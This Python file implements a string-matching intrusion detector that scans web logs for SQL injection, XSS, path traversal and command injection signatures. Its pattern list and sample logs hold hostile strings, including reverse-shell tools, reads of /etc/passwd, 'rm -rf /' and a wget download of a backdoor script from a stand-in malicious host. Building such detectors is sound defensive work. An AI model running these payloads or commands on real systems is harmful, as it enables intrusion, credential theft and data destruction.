# backend.py

# Import necessary modules
from typing import List, Tuple
import re
import time

# Sample attack patterns (can be extended)
attack_patterns = [
    "' OR '1'='1",
    "<script>",
    "../../",
    "wget",
    "curl",
    "nc",
    "'--",
    # Additional patterns
    "<img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<a href=javascript:alert(1)>",
    "../etc/passwd",
    "../../../../etc/passwd",
    "<?php",
    "system(",
    "exec(",
    "; ls",
    "| cat /etc/passwd",
    "union select",
    "select * from",
    "drop table",
    "insert into",
    "update set",
    "delete from",
    "--",
    "#",
    "/*",
    "../",
    "..\\",
    "%00",
    "%2e%2e%2f",
    "%252e%252e%252f",
    "http://",
    "https://",
    "ftp://",
    "file://",
    "$IFS",
    "| bash",
    "| sh",
    "chmod 777",
    "chown root",
    "base64 -d",
    "eval(",
    "python -c",
    "perl -e",
    "ruby -e",
    "nc -e",
    "ncat -e",
    "powershell",
    "cmd.exe",
    "/bin/sh",
    "/bin/bash",
    "whoami",
    "ifconfig",
    "ipconfig",
    "net user",
    "passwd",
    "shadow",
    "root:x:0:0:",
    # More XSS patterns
    "<script>alert",
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "onerror=",
    "onload=",
    "javascript:",
    "\"><script>",
    # Command injection patterns
    "rm -rf",
    "rm -rf /",
    "rm -rf *",
    "rm -rf .",
    "rm -rf ..",
    "cmd=",
    "cmd=rm",
    "&cmd=",
    "?cmd=",
    ";cmd=",
    "|cmd=",
    "command=",
    "exec=",
    "execute=",
    "system=",
    "; rm",
    "&& rm",
    "|| rm",
    "|rm",
    "$(rm",
    "`rm"
]

# Sample log lines (will be overridden by user input)
sample_logs = []

# Map patterns to attack types (improved and case-insensitive matching)
pattern_type_map = {
    # SQL Injection
    "' or '1'='1": "SQL Injection",
     "' OR '1'='1": "SQL Injection",
    "'--": "SQL Injection",
    "union select": "SQL Injection",
    "select * from": "SQL Injection",
    "drop table": "SQL Injection",
    "insert into": "SQL Injection",
    "update set": "SQL Injection",
    "delete from": "SQL Injection",
    "--": "SQL Injection",
    "#": "SQL Injection",
    "/*": "SQL Injection",
    "%27 or %271%27=%271": "SQL Injection",

    # XSS
    "<script>": "XSS",
    "<script>alert": "XSS",
    "<script>alert(1)</script>": "XSS",
    "<script>alert('xss')</script>": "XSS",
    "onerror=": "XSS",
    "onload=": "XSS",
    "javascript:": "XSS",
    "\"><script>": "XSS",
    "%3cscript%3e": "XSS",                # Encoded version
    "<img src=x onerror=alert(1)>": "XSS",
    "<svg/onload=alert(1)>": "XSS",

    # LFI / RFI
    "../../": "LFI/RFI",
    "../../../../etc/passwd": "LFI/RFI",
    "../etc/passwd": "LFI/RFI",
    "%2e%2e%2f": "LFI/RFI",
    "%252e%252e%252f": "LFI/RFI",
    "../": "LFI/RFI",
    "..\\": "LFI/RFI",
    "file://": "LFI/RFI",
    "http://": "RFI",
    "https://": "RFI",
    "ftp://": "RFI",

    # Command Injection
    "wget": "Command Injection",
    "curl": "Command Injection",
    "nc": "Command Injection",
    "system(": "Command Injection",
    "exec(": "Command Injection",
    "rm -rf": "Command Injection",
    "rm -rf /": "Command Injection",
    "rm -rf *": "Command Injection",
    "rm -rf .": "Command Injection",
    "rm -rf ..": "Command Injection",
    "; ls": "Command Injection",
    "| cat /etc/passwd": "Command Injection",
    "$ifs": "Command Injection",
    "| bash": "Command Injection",
    "| sh": "Command Injection",
    "chmod 777": "Command Injection",
    "chown root": "Command Injection",
    "base64 -d": "Command Injection",
    "eval(": "Command Injection",
    "python -c": "Command Injection",
    "perl -e": "Command Injection",
    "ruby -e": "Command Injection",
    "nc -e": "Command Injection",
    "ncat -e": "Command Injection",
    "powershell": "Command Injection",
    "cmd.exe": "Command Injection",
    "/bin/sh": "Command Injection",
    "/bin/bash": "Command Injection",
    "&&": "Command Injection",
    "cmd=": "Command Injection",
    "cmd=rm": "Command Injection",
    "&cmd=": "Command Injection",
    "?cmd=": "Command Injection",
    ";cmd=": "Command Injection",
    "|cmd=": "Command Injection",
    "command=": "Command Injection",
    "exec=": "Command Injection",
    "execute=": "Command Injection",
    "system=": "Command Injection",
    "; rm": "Command Injection",
    "&& rm": "Command Injection",
    "|| rm": "Command Injection",
    "|rm": "Command Injection",
    "$(rm": "Command Injection",
    "`rm": "Command Injection",

    # Reconnaissance
    "whoami": "Reconnaissance",
    "ifconfig": "Reconnaissance",
    "ipconfig": "Reconnaissance",
    "net user": "Reconnaissance",
    "passwd": "Reconnaissance",
    "shadow": "Reconnaissance",
    "root:x:0:0:": "Reconnaissance",

    # PHP Code Injection
    "<?php": "PHP Code Injection"
}


# KMP Algorithm Implementation
def compute_lps(pattern: str) -> List[int]:
    lps = [0] * len(pattern)
    length = 0
    i = 1
    while i < len(pattern):
        if pattern[i] == pattern[length]:
            length += 1
            lps[i] = length
            i += 1
        else:
            if length != 0:
                length = lps[length - 1]
            else:
                lps[i] = 0
                i += 1
    return lps

def kmp_search(text: str, pattern: str, steps: List[str]) -> Tuple[bool, List[int]]:
    lps = compute_lps(pattern)
    i = j = 0
    found_indices = []
    while i < len(text):
        steps.append(f"KMP: Comparing text[{i}]='{text[i]}' with pattern[{j}]='{pattern[j]}'")
        if pattern[j] == text[i]:
            i += 1
            j += 1
        if j == len(pattern):
            found_indices.append(i - j)
            steps.append(f"KMP: Pattern found at index {i - j}")
            j = lps[j - 1]  # Continue searching for more occurrences
        elif i < len(text) and pattern[j] != text[i]:
            if j != 0:
                j = lps[j - 1]
            else:
                i += 1
    return len(found_indices) > 0, found_indices

# Horspool Algorithm Implementation
def build_shift_table(pattern: str) -> dict:
    m = len(pattern)
    table = {}
    for i in range(m - 1):
        table[pattern[i]] = m - 1 - i
    return table

def horspool_search(text: str, pattern: str, steps: List[str]) -> Tuple[bool, List[int]]:
    m = len(pattern)
    n = len(text)
    found_indices = []
    if m > n:
        return False, []
    table = build_shift_table(pattern)
    i = 0
    while i <= n - m:
        segment = text[i:i + m]
        steps.append(f"Horspool: Checking segment '{segment}' against pattern '{pattern}'")
        if pattern == segment:
            found_indices.append(i)
            steps.append(f"Horspool: Pattern found at index {i}")
            i += 1  # Move one position to find next occurrence
        else:
            shift_char = text[i + m - 1] if i + m - 1 < n else 'EOF'
            shift = table.get(shift_char, m)
            steps.append(f"Horspool: Character '{shift_char}' not matching, shifting by {shift} positions")
            i += shift
    return len(found_indices) > 0, found_indices

# Boyer-Moore Algorithm Implementation (Bad Character Rule Only)
def build_bad_char_table(pattern: str) -> dict:
    table = {}
    for i in range(len(pattern)):
        table[pattern[i]] = i
    return table

def boyer_moore_search(text: str, pattern: str, steps: List[str]) -> Tuple[bool, List[int]]:
    m = len(pattern)
    n = len(text)
    found_indices = []
    if m > n:
        return False, []
    bad_char = build_bad_char_table(pattern)
    s = 0
    while s <= n - m:
        j = m - 1
        while j >= 0 and pattern[j] == text[s + j]:
            steps.append(f"BM: Matching pattern[{j}]='{pattern[j]}' with text[{s + j}]='{text[s + j]}'")
            j -= 1
        if j < 0:
            found_indices.append(s)
            steps.append(f"BM: Pattern found at index {s}")
            s += 1  # Move one position to find next occurrence
        else:
            shift_char = text[s + j]
            shift = max(1, j - bad_char.get(shift_char, -1))
            steps.append(f"BM: Mismatch at pattern[{j}] and text[{s + j}], shifting by {shift}")
            s += shift
    return len(found_indices) > 0, found_indices

# Naive String Matching Algorithm
def naive_search(text: str, pattern: str, steps: List[str]) -> Tuple[bool, List[int]]:
    n = len(text)
    m = len(pattern)
    found_indices = []
    
    for i in range(n - m + 1):
        steps.append(f"Naive: Checking position {i}")
        j = 0
        while j < m:
            steps.append(f"Naive: Comparing text[{i + j}]='{text[i + j]}' with pattern[{j}]='{pattern[j]}'")
            if text[i + j] != pattern[j]:
                break
            j += 1
        if j == m:
            found_indices.append(i)
            steps.append(f"Naive: Pattern found at index {i}")
    return len(found_indices) > 0, found_indices

# Detect using selected algorithm
def detect_intrusions(logs: List[str], patterns: List[str], method: str = "kmp") -> List[Tuple[str, str, str, List[str], List[int], int]]:
    detections = []
    for log in logs:
        log_lower = log.lower()
        for pattern in patterns:
            pattern_lower = pattern.lower()
            steps = []
            match = False
            found_indices = []
            # Substring match (case-insensitive)
            if pattern_lower in log_lower:
                match = True
                # Find all indices (case-insensitive)
                start = 0
                while True:
                    idx = log_lower.find(pattern_lower, start)
                    if idx == -1:
                        break
                    found_indices.append(idx)
                    start = idx + 1
                steps.append(f"Pattern '{pattern}' found as substring in log.")
            else:
                # Fallback to algorithmic search (case-sensitive)
                if method == "kmp":
                    match, found_indices = kmp_search(log, pattern, steps)
                elif method == "horspool":
                    match, found_indices = horspool_search(log, pattern, steps)
                elif method == "boyer_moore":
                    match, found_indices = boyer_moore_search(log, pattern, steps)
                elif method == "naive":
                    match, found_indices = naive_search(log, pattern, steps)
            if match:
                # Use lowercased pattern for type lookup
                attack_type = pattern_type_map.get(pattern_lower, pattern_type_map.get(pattern, "Unknown"))
                detections.append((log, pattern, attack_type, steps, found_indices, len(found_indices)))
                break
    return detections

if __name__ == "__main__":
    import sys
    import os

    method = sys.argv[1] if len(sys.argv) > 1 else "kmp"
    input_file = sys.argv[2] if len(sys.argv) > 2 else None

    if input_file and os.path.exists(input_file):
        with open(input_file, 'r') as f:
            sample_logs = [line.strip() for line in f.readlines() if line.strip()]
    else:
        sample_logs = [
            "GET /index.php?id=1' OR '1'='1 HTTP/1.1",
            "POST /search <script>alert('XSS')</script>",
            "GET /download ../../etc/passwd",
            "POST /data wget http://malicious.com/backdoor.sh",
            "NORMAL log line",
            "GET /profile.php?bio=<script>alert(1)</script> HTTP/1.1"
        ]

    start = time.time()
    results = detect_intrusions(sample_logs, attack_patterns, method)
    end = time.time()

    print(f"\n[+] Detected Intrusions using {method.upper()}:")
    for log, pattern, attack_type, steps, indices, count in results:
        print(f"\nLog: {log}\nPattern: {pattern}\nAttack Type: {attack_type}\nSteps:")
        for step in steps:
            print(f"  - {step}")
        print(f"Found at indices: {', '.join(map(str, indices))}")
        print(f"Total occurrences: {count}")
    print(f"\nExecution Time: {end - start:.6f} seconds")